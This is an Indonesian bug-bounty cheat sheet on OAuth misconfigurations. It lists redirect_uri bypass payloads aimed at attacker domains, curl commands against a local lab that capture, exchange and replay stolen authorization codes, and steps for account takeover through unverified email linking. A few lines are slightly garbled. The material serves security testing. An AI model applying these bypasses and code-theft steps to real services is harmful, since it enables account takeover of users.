# Cheat-sheet OAuth Misconfiguration (BBP Pattern)

Pola & payload yang sering diketok di program bug bounty, versi lab.

## 1. Missing/weak `state`

Survei cepat: buka konsol browser web page paling simple
```
https://app.com/auth/google.png?vendor.. (tidak ada state di URL authorize)
```
cek callback: `?code=…&state=` kosong → rentan login CSRF (attacker bisa memaksa korban
masuk ke akun attacker, atau akun korban di-link ke attacker).

PoC wrapper (dari lab):
```python
code_a = authorize_flow('attacker', CB, state='')
client_login(code_a, state='')      # tanpa state -> VULN / FIXED: error
```

## 2. redirect_uri validation

Uji daftar bypass:
```
<asli>            https://app.com/callback
suffix            https://app.com.evil.net/callback
@ trick           https://evil.net@app.com/callback
path traversal    https://app.com/callback/../evil
double encode     https://app.com%2fcb.evil.com
hybrid            https://app.com/callback.evil.com
```
Jika ada di allowlist registrar kasar (`startswith`, `host only`, `contains`), cari cara
mengarahkan browser (atau server) ke milikmu. Di lab: `redirect_uri=…/evil/s2_capture`.

## 3. Trust `email` / account linking

- Jangan pernah auto-create/login by `email` dari token tanpa `email_verified=true`.
- Attacker: daftar akun OAuth dengan email korban → login → klaim `email` korban (unverified)
  → client map ke akun korban → ATO (impact tinggi kalau email admin).
- Cek juga: provider dengan email yang TIDAK dependency? Fetch me/upn/verify dulu.

## 4. PKCE / code reuse

- Authorization code yang bisa dipakai >1x = replay (tok…A). Seharusnya one-time + TTL ~10m + binding client.
- Public client (SPA/mobile) TANPA PKCE = semua code bisa dipakai attacker yang sempet memotong.
- Test: `POST /oauth/token` dua kali dengan code yang sama → kalau 2 token valid = finding.

## Request mentah quick (untuk curl)

```bash
# authorize (as victim, bazis redirect_uri penyerang)
curl "http://127.0.0.1:5070/oauth/authorize?client_id=oauthlab-client&redirect_uri=http://127.0.0.1:5070/evil/s2_capture&scope=profile email"

# exchange code -> token (pakai code curian)
curl -X POST http://127.0.0.1:5070/oauth/token -d "code=<CODE>&grant_type=authorization_code"

# panggil resource
curl -H "Authorization: Bearer <TOKEN>" http://127.0.0.1:5070/oauth/me

# replay code
curl -X POST http://127.0.0.1:5070/oauth/token -d "code=<CODE>"   # sekali lagi
```

## Checklist singkat di BBP

- [ ] `state` ada? dibandingkan? unique per sesi?
- [ ] `redirect_uri` = exact match? apa bypass suffix/prefix/@/encode path lolos?
- [ ] account linking by email? `email_verified` digit?
- [ ] public client wajib PKCE? code one-time? TTL pendek?
- [ ] client_secret bocor di frontend/referer/git? (bonus finding)
- [ ] token disimpan di URL/fragment/history? referer header bocor? (bonus)